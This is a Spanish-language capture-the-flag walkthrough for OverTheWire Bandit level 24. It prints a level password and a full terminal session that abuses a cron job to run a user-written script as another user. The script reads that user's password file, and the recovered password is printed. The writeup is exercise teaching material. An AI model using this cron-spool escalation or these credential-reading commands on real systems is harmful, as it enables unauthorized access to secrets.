# Level 24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
User: bandit23
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
Host: bandit.labs.overthewire.org  
Port: 2220

## Solución
```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ mkdir /tmp/42101656
bandit23@bandit:/etc/cron.d$ cd /tmp/42101656
bandit23@bandit:/tmp/42101656$ touch pass
bandit23@bandit:/tmp/42101656$ nano script.sh
bandit23@bandit:/tmp/42101656$ cat script.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/42101656/pass
bandit23@bandit:/tmp/42101656$ chmod 777 -R .
bandit23@bandit:/tmp/42101656$ ls -lah
total 408K
drwxrwxrwx    2 bandit23 bandit23 4.0K Feb 27 18:09 .
drwxrwx-wt 1328 root     root     396K Feb 27 18:10 ..
-rwxrwxrwx    1 bandit23 bandit23    0 Feb 27 18:05 pass
-rwxrwxrwx    1 bandit23 bandit23   64 Feb 27 18:09 script.sh
bandit23@bandit:/tmp/42101656$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/42101656$ cat pass
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/42101656$
```
## Notas adicionales
* chmod se utiliza para cambiar los permisos de un archivo.
* El número octal 777 indica dar todos los permisos a todos los usuarios, grupos y otras personas.
* La opción -R es para indicar que se cambie los permisos a todos los archivos recursivamente.
## Referencias
